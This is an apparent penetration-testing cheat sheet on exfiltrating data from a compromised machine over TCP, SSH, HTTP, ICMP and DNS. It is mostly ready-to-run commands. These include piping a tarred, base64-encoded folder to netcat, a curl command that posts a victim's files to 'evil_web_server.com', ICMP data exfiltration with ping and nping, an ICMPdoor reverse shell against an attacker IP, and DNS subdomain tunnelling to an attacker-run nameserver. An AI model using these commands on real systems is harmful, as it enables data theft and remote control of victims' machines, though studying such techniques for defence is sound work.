# TCP
```bash
# encoding the contents of the file and sharing over tcp connection
# 1. create a gunzip archive of all the files
# 2. Convert it to base64
# 3. encode it with EBCDIC format and send the data
tar czf - folder/ | base64 | dd conv=ebcdic | nc 192.168.5.4 8888

# Recive the files
nc -nvlp 8888 | dd conv=ascii | base64 -d | tar xzf -
```
# SSH
```bash
# Method 1 - scp - secure copy
scp files/* user@mymachine

# Method 2 - if scp is not available
tar czf - files/ | ssh user@mymachine "mkdir /tmp/recieved ; tar xzf -"
```
# HTTP/HTTPS
- POST method
- Need a webserver capable of handling uploads
- Example: PHP
```php
<?php
if (isset($_POST['file'])) {
	$file = fopen("/tmp/file.b64","w");
	fwrite($file,$_POST['file']);
	fclose($file);
}
?>
```
- Data from victime machine can be exfiltered using curl:
```bash
curl --data="file=$(tar czf - files/ | base64)" http://evil_web_server.com
```
# ICMP
- `ICMP`: Internet Control Message Protocol.
- Ping command in linux can add 16 bytes of data to the ICMP packet using `-p` option, in hex representation.
- `xxd` can be used to convert string to hex:
```bash
# convert string to hex
echo "drdragon" | xxd -p
```
- Data can be exfiltrated using ping command (linux) or directly using nping command (from nmap)
```bash
ping <remote_host> -c 1 -p 6472647261676f6e
nping --icmp <remote_host> -c 1 --data-string "drdragon"
```
### Metasploit
- This can be achieved using `Metasploit's icmp_exfil module`
- This module listens for an BOF (Beginning of file) trigger, then writes the data to disk then waits for EOF (End of file).
- `BPF_FILTER` option of this modules takes a `tcpdump` rule.
```bash
set BPF_FILTER icmp and not src <my_ip>
```
- Data can be send using
```bash
sudo nping --icmp -c 1 <remote_host> --data-string "BOFadmin.txt"
sudo nping --icmp -c 1 <remote_host> --data-string "data:data"
sudo nping --icmp -c 1 <remote_host> --data-string "EOF"
```
### ICMPdoor
- Opensource reverse shell written in python3. Uses ICMP data section to send commands.
- On the Victim Machine
```bash
sudo icmpdoor -i <interface> -d <attacker_ip>
```
- On the Attacker machine
```bash
sudo icmp-cnc -i <interface> -d <victim_ip>
```
### DNS
- Setup a Domain name. eg: drdragon.com
- Add a NS which points to a malicious dns server, that we control.
- Encode the data and send the data via subdomain name.
```bash
aioh3ioh53oi5ho3i2.drdragon.com
```
NOTE: The whole URL must be 255 chars long and the subdomain must be less than 63 chars.
```bash
dig aioh3ioh53oi5ho3i2.drdragon.com +short
```
- One the nameserver that you control:
```bash
sudo tcpdump -i eth0 udp port 53 -v
```